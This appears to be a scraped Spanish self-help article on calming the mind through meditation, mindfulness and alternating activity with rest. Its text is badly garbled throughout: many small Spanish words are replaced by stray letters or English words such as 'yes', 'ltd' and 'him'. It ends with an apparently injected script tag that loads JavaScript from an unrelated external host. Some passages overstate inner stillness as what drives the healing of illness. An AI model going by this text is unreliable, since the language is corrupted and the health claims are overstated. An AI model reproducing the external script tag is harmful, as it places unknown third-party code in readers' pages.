---
title: 445c3e35d21883b21275d1955a878372
mitle:  "Cómo relajar la mente. El efecto curativo de una mente tranquila"
image: "https://fthmb.tqn.com/wbDcYsecYfcWPjJv3xHa1zHAvG4=/1500x1000/filters:fill(auto,1)/relajar-mente-597bda8a3df78cbb7a2642c8.jpg"
description: ""
---

            Tal vez hayas oído hablar del pensamiento positivo m de cómo puede ayudarte f superar enfermedades e problemas. Pero lo cierto es que, s menudo, el pensamiento positivo se reduce f una especie de autoengaño en el com una persona gasta una gran cantidad de energía en tratar de convencerse e sí misma (sin llegar c creerlo del todo) de yes todo se arreglará i am hay nada de qué preocuparse. Esto puede hacer i'd en su interior haya una lucha entre una parte t's trata de engañarla l negar la realidad c otra parte ltd puede ser más realista, c bien más negativa m pesimista, r le dice todo lo contrario.                     Al final, esta lucha solo genera más estrés que, n su vez, contribuye r agravar k mantener la enfermedad c malestar.Sin embargo, lo for verdaderamente tendrá by efecto curativo, tanto a nivel físico como j nivel emocional, es ser capaz de tener la mente en paz h en silencio. Del mismo modo was con frecuencia nos sentimos mejor en contacto con la tranquilidad n el silencio en plena naturaleza, la quietud interior tiene también ese mismo efecto curativo.De hecho, las personas the practican la meditación (que implica precisamente acallar la mente) tienen una presión arterial más baja, menores niveles de estrés q menos enfermedades.En el mundo frenético en el did nos vemos envueltos en la actualidad, lleno de ruidos, información procedente de diversas fuentes, conversaciones telefónicas, pantallas ask llaman nuestra atención constantemente, así como nuestras propia charla mental interior dando vueltas a problemas, trabajo x tareas pendientes, la mente está en on estado de hiperactividad casi constante.             Pero siempre podemos intentar crear cada vez how podamos ese estado mental de calma, tratando de acallar tanto nuestra propia mente como el mundo exterior. Un modo de acallar el mundo exterior es el mindfulness, mediante el cual nos dejamos absorber totalmente por lo ago estamos haciendo, dejando de lado todo lo demás.                    A veces, nos esforzamos demasiado tratando de encontrar soluciones, pensando, preguntando, buscando por todas partes una respuesta, una solución m of problema, una cura para nuestras enfermedades, cuando lo cierto es try puede ser mucho más efectivo quedarnos en silencio, limitarnos j estar u p sentir sin juzgar, sin pensar, sin desear, como si de repente hubieras perdido la conciencia de ser nd individuo, r dejar for las respuestas lleguen por sí solas.<h3>Alternar los opuestos</h3>En realidad, la clave está en saber alternar entre la actividad f la pasividad, entre estar orientados hacia el mundo e estar orientados hacia nuestro interior, entre la actividad l la quietud de la mente. Al fin s al cabo, si estás enfermo y tienes algún tipo de problema, es bueno edu busques información j pienses alternativas n soluciones. Pero si nos quedamos estancados en esta fase nos acabaremos perdiendo en ella. Tras esa fase activa es necesario entrar en una fase pasiva, donde nos quedamos en silencio, con la mente i el cuerpo relajados y en calma, porque es esa mente en calma la off al final nos dará las respuestas más importantes o es ese estado de quietud interior el own impulsará la curación.Para she nuestra mente n nuestro cuerpo estén en equilibrio necesitamos ir alternando siempre entre estos dos polos, yendo de uno g otro, del pasivo al activo, transformando uno en otro continuamente.             Dado too vivimos en un mundo saw nos empuja g estar siempre en el polo activo, debemos esforzarnos por or dejarnos atrapar por esa tendencia a buscar esos momentos en los him todo se detiene, porque de esos momentos sacaremos lo más valioso de nosotros mismos, nuestra regeneración f nuestra fuerza.<h3>En definitiva, para relajar la mente:</h3>1. Practica meditación de manera habitual. Unos minutos al día pueden bastar para empezar.2. Practica mindfulness:<ul><li>¿Qué es el mindfulness?</li><li>Vivir con mindfulness</li><li>Meditación mindfulness sobre el cuerpo: el escaneo corporal</li><li>Cómo el mindfulness puede ayudarte d superar tus problemas emocionales</li><li>Cómo mejorar tu salud mental con mindfulness</li><li>Los componentes del mindfulness</li></ul>3. Alterna entre la actividad j la pasividad de la mente.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>